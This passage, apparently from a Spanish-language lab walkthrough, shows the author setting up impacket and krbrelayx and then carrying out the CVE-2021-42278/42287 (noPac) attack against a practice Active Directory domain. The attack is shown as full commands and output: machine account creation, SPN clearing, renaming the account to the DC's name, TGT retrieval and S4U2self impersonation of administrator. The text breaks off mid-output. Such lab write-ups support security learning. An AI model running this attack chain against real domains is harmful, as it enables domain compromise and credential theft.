  File "/usr/local/lib/python3.9/dist-packages/pip/_vendor/rich/console.py", line 1673, in print
    extend(render(renderable, render_options))
  File "/usr/local/lib/python3.9/dist-packages/pip/_vendor/rich/console.py", line 1305, in render
    for render_output in iter_render:
  File "/usr/local/lib/python3.9/dist-packages/pip/_internal/utils/logging.py", line 134, in __rich_console__
    for line in lines:
  File "/usr/local/lib/python3.9/dist-packages/pip/_vendor/rich/segment.py", line 249, in split_lines
    for segment in segments:
  File "/usr/local/lib/python3.9/dist-packages/pip/_vendor/rich/console.py", line 1283, in render
    renderable = rich_cast(renderable)
  File "/usr/local/lib/python3.9/dist-packages/pip/_vendor/rich/protocol.py", line 36, in rich_cast
    renderable = cast_method()
  File "/usr/local/lib/python3.9/dist-packages/pip/_internal/self_outdated_check.py", line 130, in __rich__
    pip_cmd = get_best_invocation_for_this_pip()
  File "/usr/local/lib/python3.9/dist-packages/pip/_internal/utils/entrypoints.py", line 58, in get_best_invocation_for_this_pip
    if found_executable and os.path.samefile(
  File "/usr/lib/python3.9/genericpath.py", line 101, in samefile
    s2 = os.stat(f2)
FileNotFoundError: [Errno 2] No existe el fichero o el directorio: '/usr/bin/pip'
Call stack:
  File "/usr/local/bin/pip3", line 8, in <module>
    sys.exit(main())
  File "/usr/local/lib/python3.9/dist-packages/pip/_internal/cli/main.py", line 70, in main
    return command.main(cmd_args)
  File "/usr/local/lib/python3.9/dist-packages/pip/_internal/cli/base_command.py", line 101, in main
    return self._main(args)
  File "/usr/local/lib/python3.9/dist-packages/pip/_internal/cli/base_command.py", line 223, in _main
    self.handle_pip_version_check(options)
  File "/usr/local/lib/python3.9/dist-packages/pip/_internal/cli/req_command.py", line 190, in handle_pip_version_check
    pip_self_version_check(session, options)
  File "/usr/local/lib/python3.9/dist-packages/pip/_internal/self_outdated_check.py", line 236, in pip_self_version_check
    logger.warning("[present-rich] %s", upgrade_prompt)
  File "/usr/lib/python3.9/logging/__init__.py", line 1454, in warning
    self._log(WARNING, msg, args, kwargs)
  File "/usr/lib/python3.9/logging/__init__.py", line 1585, in _log
    self.handle(record)
  File "/usr/lib/python3.9/logging/__init__.py", line 1595, in handle
    self.callHandlers(record)
  File "/usr/lib/python3.9/logging/__init__.py", line 1657, in callHandlers
    hdlr.handle(record)
  File "/usr/lib/python3.9/logging/__init__.py", line 948, in handle
    self.emit(record)
  File "/usr/local/lib/python3.9/dist-packages/pip/_internal/utils/logging.py", line 179, in emit
    self.handleError(record)
Message: '[present-rich] %s'
Arguments: (UpgradePrompt(old='22.2.2', new='23.2.1'),)
```

Una vez lo tenemos vamos a crear el entorno virtual con el comando `python3 -m virtualenv myimpacket` donde myimpacket es el nombre que queremos ponerle

```csharp
┌─[root@angussmoody]─[/opt/myimpacket]
└──╼ #python3 -m virtualenv myimpacket
created virtual environment CPython3.9.2.final.0-64 in 1615ms
  creator CPython3Posix(dest=/opt/myimpacket/myimpacket, clear=False, no_vcs_ignore=False, global=False)
  seeder FromAppData(download=False, pip=bundle, setuptools=bundle, wheel=bundle, via=copy, app_data_dir=/root/.local/share/virtualenv)
    added seed packages: pip==23.2.1, setuptools==68.0.0, wheel==0.41.0
  activators BashActivator,CShellActivator,FishActivator,NushellActivator,PowerShellActivator,PythonActivator
```

Ahora activamos el entorno con el comando `source myimpacket/bin/activate`

```csharp
┌─[root@angussmoody]─[/opt/myimpacket]
└──╼ #source myimpacket/bin/activate
(myimpacket)
```

Instalamos el repositorio

```csharp
(myimpacket) ┌─[root@angussmoody]─[/opt/myimpacket]
└──╼ #python3 -m pip install .
Processing /opt/myimpacket
  Preparing metadata (setup.py) ... done
Collecting pyasn1>=0.2.3 (from impacket==0.10.1.dev1+20230728.114623.fb147c3f)
  Downloading pyasn1-0.5.0-py2.py3-none-any.whl (83 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 83.9/83.9 kB 1.9 MB/s eta 0:00:00
Collecting pycryptodomex (from impacket==0.10.1.dev1+20230728.114623.fb147c3f)
  Obtaining dependency information for pycryptodomex from https://files.pythonhosted.org/packages/45/09/ce11344724e674957402b5f3c0d663388f755ecd1c864f0c405b5f959bd8/pycryptodomex-3.18.0-cp35-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata
  Downloading pycryptodomex-3.18.0-cp35-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.4 kB)
Collecting pyOpenSSL>=21.0.0 (from impacket==0.10.1.dev1+20230728.114623.fb147c3f)
  Obtaining dependency information for pyOpenSSL>=21.0.0 from https://files.pythonhosted.org/packages/f0/e2/f8b4f1c67933a4907e52228241f4bd52169f3196b70af04403b29c63238a/pyOpenSSL-23.2.0-py3-none-any.whl.metadata
  Downloading pyOpenSSL-23.2.0-py3-none-any.whl.metadata (10 kB)
Collecting six (from impacket==0.10.1.dev1+20230728.114623.fb147c3f)
  Using cached six-1.16.0-py2.py3-none-any.whl (11 kB)
Collecting ldap3!=2.5.0,!=2.5.2,!=2.6,>=2.5 (from impacket==0.10.1.dev1+20230728.114623.fb147c3f)
  Using cached ldap3-2.9.1-py2.py3-none-any.whl (432 kB)
Collecting ldapdomaindump>=0.9.0 (from impacket==0.10.1.dev1+20230728.114623.fb147c3f)
  Downloading ldapdomaindump-0.9.4-py3-none-any.whl (18 kB)
Collecting flask>=1.0 (from impacket==0.10.1.dev1+20230728.114623.fb147c3f)
  Downloading Flask-2.3.2-py3-none-any.whl (96 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 96.9/96.9 kB 11.1 MB/s eta 0:00:00
Collecting future (from impacket==0.10.1.dev1+20230728.114623.fb147c3f)
  Downloading future-0.18.3.tar.gz (840 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 840.9/840.9 kB 7.5 MB/s eta 0:00:00
  Preparing metadata (setup.py) ... done
Collecting charset_normalizer (from impacket==0.10.1.dev1+20230728.114623.fb147c3f)
  Obtaining dependency information for charset_normalizer from https://files.pythonhosted.org/packages/f9/0d/514be8597d7a96243e5467a37d337b9399cec117a513fcf9328405d911c0/charset_normalizer-3.2.0-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata
  Downloading charset_normalizer-3.2.0-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (31 kB)
Collecting dsinternals (from impacket==0.10.1.dev1+20230728.114623.fb147c3f)
  Using cached dsinternals-1.2.4-py3-none-any.whl
Collecting Werkzeug>=2.3.3 (from flask>=1.0->impacket==0.10.1.dev1+20230728.114623.fb147c3f)
  Obtaining dependency information for Werkzeug>=2.3.3 from https://files.pythonhosted.org/packages/ba/d6/8040faecaba2feb84e1647af174b3243c9b90c163c7ea407820839931efe/Werkzeug-2.3.6-py3-none-any.whl.metadata
  Downloading Werkzeug-2.3.6-py3-none-any.whl.metadata (4.1 kB)
Collecting Jinja2>=3.1.2 (from flask>=1.0->impacket==0.10.1.dev1+20230728.114623.fb147c3f)
  Downloading Jinja2-3.1.2-py3-none-any.whl (133 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 133.1/133.1 kB 13.8 MB/s eta 0:00:00
Collecting itsdangerous>=2.1.2 (from flask>=1.0->impacket==0.10.1.dev1+20230728.114623.fb147c3f)
  Downloading itsdangerous-2.1.2-py3-none-any.whl (15 kB)
Collecting click>=8.1.3 (from flask>=1.0->impacket==0.10.1.dev1+20230728.114623.fb147c3f)
  Obtaining dependency information for click>=8.1.3 from https://files.pythonhosted.org/packages/1a/70/e63223f8116931d365993d4a6b7ef653a4d920b41d03de7c59499962821f/click-8.1.6-py3-none-any.whl.metadata
  Downloading click-8.1.6-py3-none-any.whl.metadata (3.0 kB)
Collecting blinker>=1.6.2 (from flask>=1.0->impacket==0.10.1.dev1+20230728.114623.fb147c3f)
  Downloading blinker-1.6.2-py3-none-any.whl (13 kB)
Collecting importlib-metadata>=3.6.0 (from flask>=1.0->impacket==0.10.1.dev1+20230728.114623.fb147c3f)
  Obtaining dependency information for importlib-metadata>=3.6.0 from https://files.pythonhosted.org/packages/cc/37/db7ba97e676af155f5fcb1a35466f446eadc9104e25b83366e8088c9c926/importlib_metadata-6.8.0-py3-none-any.whl.metadata
  Downloading importlib_metadata-6.8.0-py3-none-any.whl.metadata (5.1 kB)
Collecting dnspython (from ldapdomaindump>=0.9.0->impacket==0.10.1.dev1+20230728.114623.fb147c3f)
  Obtaining dependency information for dnspython from https://files.pythonhosted.org/packages/71/30/deee2ffb94194437c730a1c6230d9310ab5f73926a2549cdab91453616bb/dnspython-2.4.1-py3-none-any.whl.metadata
  Downloading dnspython-2.4.1-py3-none-any.whl.metadata (4.9 kB)
Collecting cryptography!=40.0.0,!=40.0.1,<42,>=38.0.0 (from pyOpenSSL>=21.0.0->impacket==0.10.1.dev1+20230728.114623.fb147c3f)
  Obtaining dependency information for cryptography!=40.0.0,!=40.0.1,<42,>=38.0.0 from https://files.pythonhosted.org/packages/1a/c7/b8193a0859fed883738ae99d33fe90edf05c7e3d0fdb1726f8f53d85859e/cryptography-41.0.2-cp37-abi3-manylinux_2_28_x86_64.whl.metadata
  Downloading cryptography-41.0.2-cp37-abi3-manylinux_2_28_x86_64.whl.metadata (5.2 kB)
Collecting cffi>=1.12 (from cryptography!=40.0.0,!=40.0.1,<42,>=38.0.0->pyOpenSSL>=21.0.0->impacket==0.10.1.dev1+20230728.114623.fb147c3f)
  Downloading cffi-1.15.1-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (441 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 441.2/441.2 kB 7.2 MB/s eta 0:00:00
Collecting zipp>=0.5 (from importlib-metadata>=3.6.0->flask>=1.0->impacket==0.10.1.dev1+20230728.114623.fb147c3f)
  Obtaining dependency information for zipp>=0.5 from https://files.pythonhosted.org/packages/8c/08/d3006317aefe25ea79d3b76c9650afabaf6d63d1c8443b236e7405447503/zipp-3.16.2-py3-none-any.whl.metadata
  Downloading zipp-3.16.2-py3-none-any.whl.metadata (3.7 kB)
Collecting MarkupSafe>=2.0 (from Jinja2>=3.1.2->flask>=1.0->impacket==0.10.1.dev1+20230728.114623.fb147c3f)
  Obtaining dependency information for MarkupSafe>=2.0 from https://files.pythonhosted.org/packages/de/63/cb7e71984e9159ec5f45b5e81e896c8bdd0e45fe3fc6ce02ab497f0d790e/MarkupSafe-2.1.3-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata
  Downloading MarkupSafe-2.1.3-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.0 kB)
Collecting pycparser (from cffi>=1.12->cryptography!=40.0.0,!=40.0.1,<42,>=38.0.0->pyOpenSSL>=21.0.0->impacket==0.10.1.dev1+20230728.114623.fb147c3f)
  Using cached pycparser-2.21-py2.py3-none-any.whl (118 kB)
Downloading pyOpenSSL-23.2.0-py3-none-any.whl (59 kB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 59.0/59.0 kB 10.2 MB/s eta 0:00:00
Downloading charset_normalizer-3.2.0-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (202 kB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 202.1/202.1 kB 11.2 MB/s eta 0:00:00
Downloading pycryptodomex-3.18.0-cp35-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.1 MB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 2.1/2.1 MB 11.0 MB/s eta 0:00:00
Downloading click-8.1.6-py3-none-any.whl (97 kB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 97.9/97.9 kB 15.5 MB/s eta 0:00:00
Downloading cryptography-41.0.2-cp37-abi3-manylinux_2_28_x86_64.whl (4.3 MB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 4.3/4.3 MB 16.2 MB/s eta 0:00:00
Downloading importlib_metadata-6.8.0-py3-none-any.whl (22 kB)
Downloading Werkzeug-2.3.6-py3-none-any.whl (242 kB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 242.5/242.5 kB 18.2 MB/s eta 0:00:00
Downloading dnspython-2.4.1-py3-none-any.whl (300 kB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 300.3/300.3 kB 17.3 MB/s eta 0:00:00
Downloading MarkupSafe-2.1.3-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (25 kB)
Downloading zipp-3.16.2-py3-none-any.whl (7.2 kB)
Building wheels for collected packages: impacket, future
  Building wheel for impacket (setup.py) ... done
  Created wheel for impacket: filename=impacket-0.10.1.dev1+20230728.114623.fb147c3f-py3-none-any.whl size=1597541 sha256=7d8f4824da7b703e3303cefea7354c0b95e03f444117f426efd17222eb9c9aeb
  Stored in directory: /tmp/pip-ephem-wheel-cache-7xefcxv_/wheels/58/28/b6/efb932e39857e689ae454c4be2f5c9613a685cc2ef73084fd3
  Building wheel for future (setup.py) ... done
  Created wheel for future: filename=future-0.18.3-py3-none-any.whl size=492023 sha256=54379d4aef90bbecea7486820680c632c67724dd2132b8d6330e3e8988f22c0c
  Stored in directory: /root/.cache/pip/wheels/bf/5d/6a/2e53874f7ec4e2bede522385439531fafec8fafe005b5c3d1b
Successfully built impacket future
Installing collected packages: zipp, six, pycryptodomex, pycparser, pyasn1, MarkupSafe, itsdangerous, future, dsinternals, dnspython, click, charset_normalizer, blinker, Werkzeug, ldap3, Jinja2, importlib-metadata, cffi, ldapdomaindump, flask, cryptography, pyOpenSSL, impacket
Successfully installed Jinja2-3.1.2 MarkupSafe-2.1.3 Werkzeug-2.3.6 blinker-1.6.2 cffi-1.15.1 charset_normalizer-3.2.0 click-8.1.6 cryptography-41.0.2 dnspython-2.4.1 dsinternals-1.2.4 flask-2.3.2 future-0.18.3 impacket-0.10.1.dev1+20230728.114623.fb147c3f importlib-metadata-6.8.0 itsdangerous-2.1.2 ldap3-2.9.1 ldapdomaindump-0.9.4 pyOpenSSL-23.2.0 pyasn1-0.5.0 pycparser-2.21 pycryptodomex-3.18.0 six-1.16.0 zipp-3.16.2
```

Fusionamos los pull request con el comando `git fetch origin pull/1224/head:1224`

```csharp
(myimpacket)┌─[root@angussmoody]─[/opt/myimpacket]
└──╼ #git fetch origin pull/1224/head:1224
remote: Enumerating objects: 17, done.
remote: Counting objects: 100% (8/8), done.
Desempaquetando objetos: 100% (17/17), 8.13 KiB | 260.00 KiB/s, listo.
remote: Total 17 (delta 8), reused 8 (delta 8), pack-reused 9
Desde https://github.com/SecureAuthCorp/impacket
 * [nueva referencia]  refs/pull/1224/head -> 1224
```

y el comando `git fetch origin pull/1202/head:1202`

```csharp
(myimpacket) ┌─[root@angussmoody]─[/opt/myimpacket]
└──╼ #git fetch origin pull/1202/head:1202
remote: Enumerating objects: 690, done.
remote: Counting objects: 100% (478/478), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 690 (delta 473), reused 472 (delta 472), pack-reused 212
Recibiendo objetos: 100% (690/690), 295.31 KiB | 1.22 MiB/s, listo.
Resolviendo deltas: 100% (503/503), completado con 83 objetos locales.
Desde https://github.com/SecureAuthCorp/impacket
 * [nueva referencia]  refs/pull/1202/head -> 1202
```

Ahora fusionamos los pull requets en nuestra rama con los comandos `git merge 1202`

```csharp
┌─[root@angussmoody]─[/opt/myimpacket]
└──╼ #git merge 1202
advertencia: refname '1202' is ambiguous.
advertencia: refname '1202' is ambiguous.
Auto-fusionando examples/Get-GPPPassword.py
CONFLICTO (contenido): Conflicto de fusión en examples/Get-GPPPassword.py
Auto-fusionando examples/findDelegation.py
Auto-fusionando examples/getST.py
Auto-fusionando examples/rbcd.py
Auto-fusionando examples/smbserver.py
Auto-fusionando examples/ticketer.py
CONFLICTO (contenido): Conflicto de fusión en examples/ticketer.py
Auto-fusionando impacket/examples/ntlmrelayx/attacks/ldapattack.py
CONFLICTO (contenido): Conflicto de fusión en impacket/examples/ntlmrelayx/attacks/ldapattack.py
Auto-fusionando impacket/examples/ntlmrelayx/attacks/smbattack.py
Auto-fusionando impacket/examples/ntlmrelayx/clients/smbrelayclient.py
Auto-fusionando impacket/ntlm.py
Auto-fusionando impacket/smbserver.py
Fusión automática falló; arregle los conflictos y luego realice un commit con el resultado.
```

y el comando git merge 1224

```csharp
┌─[✗]─[root@angussmoody]─[/opt/myimpacket]
└──╼ #git merge 1224
error: No es posible hacer merge porque tienes archivos sin fusionar.
ayuda: Corrígelos en el árbol de trabajo y entonces usa 'git add/rm <archivo>',
ayuda: como sea apropiado, para marcar la resolución y realizar un commit.
fatal: Saliendo porque existe un conflicto sin resolver.
```

comprobamos que tengamos la herramienta renameMachine con el comando `renameMachine.py -h`

```csharp
(myimpacket) ┌─[✗]─[root@angussmoody]─[/opt/myimpacket]
└──╼ #renameMachine.py -h
Impacket v0.10.1.dev1+20230728.114623.fb147c3f - Copyright 2022 Fortra

usage: renameMachine.py [-h] -current-name CURRENT_NAME -new-name NEW_NAME [-use-ldaps] [-ts] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
                        [-dc-ip ip address]
                        identity

Python script for modifying the sAMAccountName of an account (can be used for CVE-2021-42278)

positional arguments:
  identity              domain.local/username[:password]

optional arguments:
  -h, --help            show this help message and exit
  -current-name CURRENT_NAME
                        sAMAccountName of the object to edit
  -new-name NEW_NAME    New sAMAccountName to set for the target object
  -use-ldaps            Use LDAPS instead of LDAP
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be
                        found, it will use the ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)

connection:
  -dc-ip ip address     IP Address of the domain controller or KDC (Key Distribution Center) for Kerberos. If omitted it will use the domain part (FQDN)
                        specified in the identity parameter
```

y la herramienta getST.py con el comando `getST.py -h`

```csharp
┌─[✗]─[root@angussmoody]─[/opt]
└──╼ #getST.py -h
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

usage: getST.py [-h] -spn SPN [-impersonate IMPERSONATE]
                [-additional-ticket ticket.ccache] [-ts] [-debug]
                [-force-forwardable] [-hashes LMHASH:NTHASH] [-no-pass] [-k]
                [-aesKey hex key] [-dc-ip ip address]
                identity

Given a password, hash or aesKey, it will request a Service Ticket and save it
as ccache

positional arguments:
  identity              [domain/]username[:password]

optional arguments:
  -h, --help            show this help message and exit
  -spn SPN              SPN (service/server) of the target service the service
                        ticket will be generated for
  -impersonate IMPERSONATE
                        target username that will be impersonated (thru
                        S4U2Self) for quering the ST. Keep in mind this will
                        only work if the identity provided in this scripts is
                        allowed for delegation to the SPN specified
  -additional-ticket ticket.ccache
                        include a forwardable service ticket in a S4U2Proxy
                        request for RBCD + KCD Kerberos only
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON
  -force-forwardable    Force the service ticket obtained through S4U2Self to
                        be forwardable. For best results, the -hashes and
                        -aesKey values for the specified -identity should be
                        provided. This allows impresonation of protected users
                        and bypass of "Kerberos-only" constrained delegation
                        restrictions. See CVE-2020-17049

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from
                        ccache file (KRB5CCNAME) based on target parameters.
                        If valid credentials cannot be found, it will use the
                        ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256
                        bits)
  -dc-ip ip address     IP Address of the domain controller. If ommited it use
                        the domain part (FQDN) specified in the target
                        parameter
```

Lo que haremos es añadir un ordenador, borrar el SPN de ese ordenador, renombrar el ordenador con el mismo nombre que el DC, obtener un TGT para ese ordenador, restablecer el nombre del ordenador a su nombre original, obtener un ticket de servicio con el TGT que obtuvimos anteriormente y finalmente dcsync :) podemos ver una explición completa en el blog de [Charlie Clark](https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html){:target="_blank"} 

primero vamos a adicionar una nueva computadora con el comando

`addcomputer.py -computer-name 'samaccountname$' -computer-pass 'ComputerPassword' -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH 'north.sevenkingdoms.local/jon.snow:iknownothing'`

```csharp
(myimpacket) ┌─[root@angussmoody]─[/opt/myimpacket]
└──╼ #addcomputer.py -computer-name 'samaccountname$' -computer-pass 'ComputerPassword' -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH 'north.sevenkingdoms.local/jon.snow:iknownothing'
Impacket v0.10.1.dev1+20230728.114623.fb147c3f - Copyright 2022 Fortra

[*] Successfully added machine account samaccountname$ with password ComputerPassword.
```

Borrar las SPNs de nuestro nuevo ordenador  (con dirkjan [krbrelayx](https://github.com/dirkjanm/krbrelayx){:target="_blank"}  tool addspn) nos clonamos el repositorio con el comando `git clone https://github.com/dirkjanm/krbrelayx.git`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Scripts]
└──╼ #git clone https://github.com/dirkjanm/krbrelayx.git
Clonando en 'krbrelayx'...
remote: Enumerating objects: 187, done.
remote: Counting objects: 100% (36/36), done.
remote: Compressing objects: 100% (12/12), done.
remote: Total 187 (delta 27), reused 24 (delta 24), pack-reused 151
Recibiendo objetos: 100% (187/187), 90.12 KiB | 562.00 KiB/s, listo.
Resolviendo deltas: 100% (103/103), listo.
```

ahora ingresamos al directorio con el comando `cd krbrelayx/`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Scripts]
└──╼ #cd krbrelayx/
```

Ejecutamos la herramienta addspn.py con el comando `python3 addspn.py -h`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Scripts/krbrelayx]
└──╼ #python3 addspn.py -h
usage: addspn.py [-h] [-u USERNAME] [-p PASSWORD] [-t TARGET] [-T TARGETTYPE] [-s SPN] [-r] [-c] [-q] [-a] [-k] [-dc-ip ip address] [-aesKey hex key] HOSTNAME

Add an SPN to a user/computer account

Required options:
  HOSTNAME              Hostname/ip or ldap://host:port connection string to connect to

Main options:
  -h, --help            show this help message and exit
  -u USERNAME, --user USERNAME
                        DOMAIN\username for authentication
  -p PASSWORD, --password PASSWORD
                        Password or LM:NTLM hash, will prompt if not specified
  -t TARGET, --target TARGET
                        Computername or username to target (FQDN or COMPUTER$ name, if unspecified user with -u is target)
  -T TARGETTYPE, --target-type TARGETTYPE
                        Target type (samname or hostname) If unspecified, will assume it's a hostname if there is a . in the name and a SAM name otherwise.
  -s SPN, --spn SPN     servicePrincipalName to add (for example: http/host.domain.local or cifs/host.domain.local)
  -r, --remove          Remove the SPN instead of add it
  -c, --clear           Clear, i.e. remove all SPNs
  -q, --query           Show the current target SPNs instead of modifying anything
  -a, --additional      Add the SPN via the msDS-AdditionalDnsHostName attribute
  -k, --kerberos        Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be
                        found, it will use the ones specified in the command line
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
```

para borrar las SPNs del nuevo computador ejecutamos la herramienta con el comando

`addspn.py --clear -t 'samaccountname$' -u 'north.sevenkingdoms.local\jon.snow' -p 'iknownothing' 'winterfell.north.sevenkingdoms.local'`

`En mi caso desde la ruta que lo tengo agregado.`

```csharp
(myimpacket) ┌─[root@angussmoody]─[/opt/myimpacket]
└──╼ #/mnt/angussMoody/Scripts/krbrelayx/addspn.py --clear -t 'samaccountname$' -u 'north.sevenkingdoms.local\jon.snow' -p 'iknownothing' 'winterfell.north.sevenkingdoms.local'
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] Printing object before clearing
DN: CN=samaccountname,CN=Computers,DC=north,DC=sevenkingdoms,DC=local - STATUS: Read - READ TIME: 2023-07-30T18:41:19.442980
    sAMAccountName: samaccountname$

[+] SPN Modified successfully
```

Vamos a cambiar el nombre del ordenador por el del DC con el comando

`renameMachine.py -current-name 'samaccountname$' -new-name 'winterfell' -dc-ip 'winterfell.north.sevenkingdoms.local' north.sevenkingdoms.local/jon.snow:iknownothing`

```csharp
(myimpacket) ┌─[root@angussmoody]─[/opt/myimpacket]
└──╼ #renameMachine.py -current-name 'samaccountname$' -new-name 'winterfell' -dc-ip 'winterfell.north.sevenkingdoms.local' north.sevenkingdoms.local/jon.snow:iknownothing
Impacket v0.10.1.dev1+20230728.114623.fb147c3f - Copyright 2022 Fortra

[*] Modifying attribute (sAMAccountName) of object (CN=samaccountname,CN=Computers,DC=north,DC=sevenkingdoms,DC=local): (samaccountname$) -> (winterfell)
[*] New sAMAccountName does not end with '$' (attempting CVE-2021-42278)
[*] Target object modified successfully!
```

Ahora obtenemos un TGT con el comando

`getTGT.py -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell':'ComputerPassword'`

```csharp
(myimpacket) ┌─[root@angussmoody]─[/opt/myimpacket]
└──╼ #getTGT.py -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell':'ComputerPassword'
Impacket v0.10.1.dev1+20230728.114623.fb147c3f - Copyright 2022 Fortra

[*] Saving ticket in winterfell.ccache
```

revisamos que si quedó creado en nuestro directorio

```csharp
(myimpacket) ┌─[root@angussmoody]─[/opt/myimpacket]
└──╼ #ll winterfell.ccache 
Permissions Size User Date Modified Name
.rw-r--r--  1,4k root 30 jul 18:42  winterfell.ccache
```

y ahora vamos a restablecer el nombre del ordenador al nombre original con el comando

`renameMachine.py -current-name 'winterfell' -new-name 'samaccount$' north.sevenkingdoms.local/jon.snow:iknownothing`

```csharp
(myimpacket) ┌─[root@angussmoody]─[/opt/myimpacket]
└──╼ #renameMachine.py -current-name 'winterfell' -new-name 'samaccount$' north.sevenkingdoms.local/jon.snow:iknownothing
Impacket v0.10.1.dev1+20230728.114623.fb147c3f - Copyright 2022 Fortra

[*] Modifying attribute (sAMAccountName) of object (CN=samaccountname,CN=Computers,DC=north,DC=sevenkingdoms,DC=local): (winterfell) -> (samaccount$)
[*] Target object modified successfully!
```

Obtener un ticket de servicio con S4U2self presentando el TGT anterior, primero debemos exportar el ticket relacionado con el comando

`export KRB5CCNAME=/opt/myimpacket/winterfell.ccache`

```csharp
(myimpacket) ┌─[root@angussmoody]─[/opt/myimpacket]
└──╼ #export KRB5CCNAME=/opt/myimpacket/winterfell.ccache
```

y ahora si vamos a obtener el ticket con el comando

`getST.py -self -impersonate 'administrator' -altservice 'CIFS/winterfell.north.sevenkingdoms.local' -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell' -debug`

```csharp
(myimpacket) ┌─[root@angussmoody]─[/opt/myimpacket]
└──╼ #getST.py -self -impersonate 'administrator' -altservice 'CIFS/winterfell.north.sevenkingdoms.local' -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell' -debug
Impacket v0.10.1.dev1+20230728.114623.fb147c3f - Copyright 2022 Fortra

[+] Impacket Library Installation Path: /opt/myimpacket/myimpacket/lib/python3.9/site-packages/impacket
[+] Using Kerberos Cache: /opt/myimpacket/winterfell.ccache
[+] Returning cached credential for KRBTGT/NORTH.SEVENKINGDOMS.LOCAL@NORTH.SEVENKINGDOMS.LOCAL
[+] Using TGT from cache
[+] Username retrieved from CCache: winterfell
[*] Impersonating administrator
[+] AUTHENTICATOR
Authenticator:
 authenticator-vno=5
 crealm=NORTH.SEVENKINGDOMS.LOCAL
 cname=PrincipalName:
  name-type=1
  name-string=SequenceOf:
   winterfell

 cusec=329179
 ctime=20230730234822Z

[+] S4UByteArray
 0000   01 00 00 00 61 64 6D 69  6E 69 73 74 72 61 74 6F   ....administrato
 0010   72 6E 6F 72 74 68 2E 73  65 76 65 6E 6B 69 6E 67   rnorth.sevenking
 0020   64 6F 6D 73 2E 6C 6F 63  61 6C 4B 65 72 62 65 72   doms.localKerber
 0030   6F 73                                              os
[+] CheckSum
 0000   3C 3F 30 85 95 B6 06 5D  2B 16 A4 19 26 40 34 F1   <?0....]+...&@4.
[+] PA_FOR_USER_ENC
PA_FOR_USER_ENC:
 userName=PrincipalName:
  name-type=1
  name-string=SequenceOf:
   administrator

 userRealm=north.sevenkingdoms.local
 cksum=Checksum:
  cksumtype=-138
  checksum=0x3c3f308595b6065d2b16a419264034f1

 auth-package=Kerberos

[+] Final TGS
TGS_REQ:
 pvno=5
 msg-type=12
 padata=SequenceOf:
  PA_DATA:
   padata-type=1
